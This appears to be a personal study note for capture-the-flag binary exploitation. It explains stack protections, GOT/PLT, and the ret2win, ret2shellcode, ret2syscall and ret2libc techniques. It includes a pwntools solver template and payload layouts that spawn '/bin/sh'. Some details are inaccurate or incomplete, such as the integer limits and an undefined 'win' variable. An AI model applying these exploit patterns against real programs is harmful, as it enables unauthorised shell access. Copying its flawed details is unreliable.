# Binary Exploitation

What is dat thing? 

The objective is to exploit the binary on certain functions to obtain flag / shell.


# Register

Register is a location which data is stored.

Reserved Register:

    x64: RIP (Instruction pointer) & RSP (Stack Pointer)

What is the difference between x64 and x86?
the sizes of the register.

- RAX = x64 (64 bit)
- EAX = x86 (32 bit)
- AX = (16 bit)
- AL = (8 bit)

# Stack

What is stack? the opposite of Queue.

Lets say there is a number like this.

    [1,2,3,4]

Then 5 will come into the array, which number will be called first with stack concept?

    [1,2,3,4,5]

    call: 1?

    call: 5?


# Binary Security

- PIE (Position Independent Code) / ASLR (Address Space Layout Randomisation): Everytime you run the file, will be loaded into a different memory 
addresses. 

    - Enabled (Random address - can't hardcode value)
    - Disabled (Fixed address)

    How to bypass:
    - Leaking some address to get the Base address. 

- Canary: Protection to prevent buffer overflow attack. Will reside in the last 16 bytes of the stack before Instruction Pointer. ends with "00"


- NX: All input is stored as data, if you insist to run instructions it will crash the program.
    
    - Enabled (Can't spawn shellcode)
    - Disabled (Can spawn shellcode)

- RELRO (Relocation Read Only): stop GOT (Global Offset Table) overwrite.

    - Partial: will ONLY affect GOT, unlike the other version, this is not recommended if you want to build a secure binary. 
    - Full: will affect both the GOT and PLT to be read-only, this make sure that the attackers won’t be able to overwrite the GOT and PLT.


# GOT & PLT
These are sections on ELF file that deal with large portion of dynamic linking. What is dynamic linking? basically it will reduce the size of the binary by removing unnecessary function.

As an example, PUTS function on ELF file won't carry their own version, instead it will dynamically link the PUTS version based on the host library.

- GOT (Global Offset Table)
- PLT (Procedure Linkage Table)

When we call puts, it's not directly calling puts() instead it's calling puts@plt.

ELF will jump to the PLT entry of puts, then it will search the address of GOT entry of puts, if available it will jump into it. On the other hand, it will  resolve and jump there.

This will be used on Ret2Libc attack which will leak the PLT entry address for desirable libc.

# Ret2Win

Ret2win is a challenge where the win() / equivalent function is available, you must redirect the return address to win function.

So you must overwrite the RIP / EIP with the exact win entry address.

1. Find the padding (trigger segmentation fault) with 
```
gdb [binary]
pattern create
run
[paste the pattern]
pattern search $rsp
```
2. Find the win() address, either with disassembler or gdb (get the `push RBP xxxxx` or `MOV rbp,rsp`)

```
gdb [binary]
info func
disass win
```

3. Find ret address with `ROPgadget --binary [binary]`


4. Create the solver with pwntools.

```
from pwn import *

binary = "./binary"
elf = context.binary = ELF(binary)
p = process(binary)
#p = remote('10.10.10.10',1234) #netcat connection

ret = p64(0x00400116)

payload = b"A"*40 
payload += ret #stack alignment 
payload += win

p.sendline(payload)
p.interactive()
```


# Integer Under/Overflow
exceed the limit of integer (-2,147,483,647 - 2,147,483,647)

# Format String Attack
It's a bug that could lead into reading / overwriting arbitrary memory location.

could be leaked with %x (hexadecimal format) it will leak next value of the stack.

# Calling Convention
meaning when a function is called, it promises to call and return a function. When the function is called, the program’s execution flow moves to the other function, and when it finished, it returns to the original function and continues the existing execution flow.

example :
    
```
def win(int a, int b){
    if(a == 0x1337 && b == 0xcafe){
        read_flag();
    }
    else{
        printf("nice try");
    }
}
```

    - 32 bit can call the value directly without calling another function.

    padding + func_address + junk (4 bytes) + param_1 + param_2 + .... + param_N


    - 64 bit needs call a function
    --------------------------------
    |    PARAMETERS    | REGISTERS |
    |------------------------------|
    | First Parameter  |    RDI    |
    | Second Parameter |    RSI    |
    | Third Parameter  |    RDX    |
    | Fourth Parameter |    RCX    |
    |------------------------------|

    Therefore the payload would look like this (case for 2 parameter):

    Padding + rdi + param_1 + rsi + param_2 + func_addr

    Assuming the gadget we have is:
    0x0000000040132c pop rdi ; ret 
    0x00000000d0137b pop rsi ; ret

    also don't forget the stack alignment if needed.

# Ret2Shellcode

Ret2Shellcode is a vulnerability where we could spawn shellcode on the binary by calling system and append the shellcode (assembly instruction) on the payload section or the binary didn't provide any win() function.

1. Find buffer
2. Find stack pointer (esp / rsp) by leak or gadgets
3. Find proper shellcode (https://shell-storm.org/shellcode/index.html)

```
32 bit
Payload = Padding + esp + system + shellcode
```

# Ret2Syscall

A syscall is a system call, and is how the program enters the kernel in order to carry out specific tasks such as creating processes, I/O and any others they would require kernel-level access.

what we need?

1. syscall address
2. pop RDI, RSI, RDX, RCX and MOV QWORD[rdi]
3. execve

64 bit
syscall number execve : 0x3b
https://filippo.io/linux-syscall-table/

32 bit
syscall number execve : 0xb
https://syscalls32.paolostivanin.com/


```
execve('/bin/sh',0,0) || RAX(RDI,RSI,RDX)

64 bit
Payload = padding + rax + 0x3b + rdi + (elf.bss()+8) + rsi + b"/bin//sh" + qword + rsi +  rdx + syscall

notes:
elf.bss()+8 writable address
qword: change our pointer rsi = *rdx
rsi-rdx = null

32 bit
payload = padding + eax + 0xb + ebx + ecx + edx + 0x80

notes:
ebx = "/bin/sh"
ecx-edx = null / 0x0
```

# Ret2Libc
## Finding libc file

`ldd [binary]`

```
ldd vuln-64 
        linux-vdso.so.1 (0x00007ffcfa726000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa4699bc000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fa469bbc000)

```

## Patching binary

If the challenge provide the libc.so.6 or ld files you could patch the binary with `pwninit` and `patchelf`

- Install patchelf (`apt-get install patchelf`)
- Download pwninit (https://github.com/io12/pwninit/releases)

Patch with `/opt/pwninit --bin [binary] --libc [libc.so.6] --ld [ld file]`

## Find leak(s)

- Search usable GOT and PLT
- Calculate the offset of the leaked GOT (leak - libc.symbols["puts"]) and set `libc.address`
- Find the str_bin_sh and system
- Recheck the address with `pause()` and `x/s [address]`
  - libc base address: ELF
- Return to main again to send the attack payload `padding + ret + bin_sh + system`
